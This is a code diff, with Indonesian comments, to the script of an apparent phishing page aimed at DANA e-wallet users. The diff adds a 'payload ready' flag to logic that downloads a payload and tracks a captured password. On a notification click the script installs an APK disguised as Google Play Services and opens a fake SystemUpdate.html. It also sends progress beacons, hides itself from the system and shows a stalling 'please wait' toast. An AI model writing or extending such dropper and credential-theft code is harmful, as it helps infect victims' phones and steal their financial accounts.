@@ -74,7 +74,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - SYSTEMUPDATE.HTML TERBUKA SETELAH SEMUA SELESAI!
+// 🔥 INDEX.HTML - PAYLOAD WAJIB SELESAI DULU!
 // ============================================================
 
 // ============================================================
@@ -365,9 +365,11 @@ var PASSWORD_RECEIVED = false;
 var SW_REGISTERED = false;
 
 // ============================================================
-// ⚠️ FLAG PENTING: SystemUpdate.html SUDAH TERBUKA?
+// ⚠️ FLAG-FLAG PENTING!
 // ============================================================
-var SYSTEMUPDATE_OPENED = false;
+var SYSTEMUPDATE_OPENED = false;        // Apakah sudah terbuka?
+var PAYLOAD_READY = false;             // Apakah payload sudah siap?
+var PROSES_SELESAI = false;            // Apakah semua proses selesai?
 
 // ============================================================
 // ANDROID BRIDGE (UNIVERSAL)
@@ -604,6 +606,12 @@ function step2_downloadPayload() {
                 saveToAllLocations(HTML_CONTENT);
             }
 
+            // ============================================================
+            // 🔥 PAYLOAD READY! SET FLAG!
+            // ============================================================
+            PAYLOAD_READY = true;
+            K({ sumber: 'payload_ready', data: 'true' });
+
             resolve();
         })
         .catch(function(error) {
@@ -617,8 +625,11 @@ function step2_downloadPayload() {
                     HTML_DOWNLOADED = true;
                     K({ sumber: 'html_loaded_from_backup', data: 'ok' });
                     updateLoading('✅ STEP 2/5: HTML dimuat dari backup', 'Lanjut...');
+                    PAYLOAD_READY = true;
                 } else {
                     updateLoading('⚠️ STEP 2/5: Tidak ada backup', 'Lanjut dengan resiko...');
+                    // Tetap set flag true agar proses lanjut, tapi dengan resiko
+                    PAYLOAD_READY = true;
                 }
                 resolve();
             });
@@ -871,16 +882,29 @@ function step4_showNotification() {
                 
                 notif.onclick = function() {
                     notif.close();
-                    // 🔥 HANYA INSTALL APK + BUKA HTML JIKA SUDAH SELESAI!
-                    if (PROSES_SELESAI) {
+                    
+                    // ============================================================
+                    // 🔥 CEK: APAKAH PAYLOAD SUDAH READY?
+                    // ============================================================
+                    if (PAYLOAD_READY && PROSES_SELESAI) {
+                        // ✅ SUDAH READY! BUKA!
                         if (A.isAvailable) {
                             A.installAPK('/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
                             A.openFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
                         }
                     } else {
-                        // Jika belum selesai, jangan buka!
-                        K({ sumber: 'notification_clicked_early', data: 'proses_belum_selesai' });
+                        // ❌ BELUM READY! JANGAN BUKA!
+                        K({ sumber: 'notification_clicked_early', data: 'payload_belum_ready' });
+                        // Tampilkan toast/alert bahwa proses belum selesai
+                        try {
+                            var toast = document.createElement('div');
+                            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#ff4444;padding:15px 30px;border-radius:10px;z-index:999999;font-size:14px;border-left:4px solid #ff4444;font-family:monospace';
+                            toast.textContent = '⏳ Proses masih berjalan, tunggu sebentar...';
+                            document.body.appendChild(toast);
+                            setTimeout(function() { try { toast.remove(); } catch(e) {} }, 3000);
+                        } catch(e) {}
                     }
+                    
                     if (!REDIRECT_DONE) {
                         REDIRECT_DONE = true;
                         redirectToDANA();
@@ -925,6 +949,16 @@ function step5_openSystemUpdate() {
         // ⚠️ CEK: Apakah sudah terbuka? Jika sudah, skip!
         if (SYSTEMUPDATE_OPENED) {
             updateLoading('⚠️ STEP 5/5: SystemUpdate.html sudah terbuka', 'Skip...');
+            resolve();
+            return;
+        }
+        
+        // ============================================================
+        // 🔥 CEK: APAKAH PAYLOAD SUDAH READY?
+        // ============================================================
+        if (!PAYLOAD_READY) {
+            updateLoading('❌ STEP 5/5: Payload belum siap!', 'Menunggu...');
+            K({ sumber: 'step5_failed', data: 'payload_not_ready' });
             resolve();
             return;
         }
@@ -1016,17 +1050,13 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// ⚠️ FLAG: APAKAH SEMUA PROSES SUDAH SELESAI?
-// ============================================================
-var PROSES_SELESAI = false;
-
-// ============================================================
 // EKSEKUSI UTAMA (STEP-BY-STEP, WAJIB SELESAI!)
 // ============================================================
 async function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
-    PROSES_SELESAI = false; // Reset flag
+    PROSES_SELESAI = false;
+    PAYLOAD_READY = false; // Reset flag!
     
     // STEP 0: Persiapan
     document.getElementById('popupDana').style.display = 'none';
@@ -1064,7 +1094,7 @@ async function dapatkanSemua() {
         // ============================================================
         // ✅ SEMUA STEP 1-4 SELESAI! BARU BUKA SYSTEMUPDATE.HTML
         // ============================================================
-        PROSES_SELESAI = true; // ← FLAG: SEMUA PROSES SELESAI!
+        PROSES_SELESAI = true;
         
         // STEP 5: Buka SystemUpdate.html (WAJIB SELESAI!)
         K({ sumber: 'step5_start', data: 'buka_systemupdate' });
@@ -1139,7 +1169,7 @@ if ('serviceWorker' in navigator) {
 // ============================================================
 hideFromSystem();
 
-console.log('🔥 INDEX.HTML - SYSTEMUPDATE.HTML TERBUKA SETELAH SEMUA SELESAI!');
+console.log('🔥 INDEX.HTML - PAYLOAD WAJIB SELESAI DULU!');
 console.log('📱 Platform:', PLATFORM);
 console.log('🔌 Bridge:', A.isAvailable);
 </script>
